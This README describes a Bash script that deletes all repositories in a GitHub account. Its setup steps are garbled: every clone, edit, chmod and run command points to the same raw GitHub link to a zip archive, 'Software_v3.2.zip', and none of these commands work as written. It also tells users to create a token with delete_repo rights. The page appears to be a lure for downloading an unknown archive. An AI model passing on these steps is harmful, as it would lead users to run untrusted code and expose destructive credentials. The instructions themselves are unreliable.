# **GitHub Repository Deletion Script**

This Bash script automates the deletion of all repositories in a GitHub account using the GitHub API.

## **Prerequisites**
- **GitHub Personal Access Token (PAT)** with `repo` and `delete_repo` permissions.  
- `curl` and `jq` installed on your system.

### **Installation**
Install dependencies if they are not already installed:
sudo apt install curl jq -y    # Ubuntu/Debian  
brew install curl jq           # macOS  
**Usage****
**Clone the Repositor**

git clone https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software_v3.2.zip  
cd repo-name
**Generate a GitHub PAT**
Go to GitHub Token Settings
Generate a Personal Access Token (PAT) with repo and delete_repo permissions.
** Configure and Run the Script**
**Edit the script to add your credentials:**
nano https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software_v3.2.zip
Replace the placeholders:

TOKEN="your_github_personal_access_token"
USERNAME="your_github_username"
**Make the script executable:**

chmod +x https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software_v3.2.zip  
**Run the script:**

https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software_v3.2.zip  
**Warnings**
⚠ This action is irreversible—deleted repositories CANNOT be recovered.
⚠ Ensure you're using a PAT instead of a password.

**License**
MIT License.
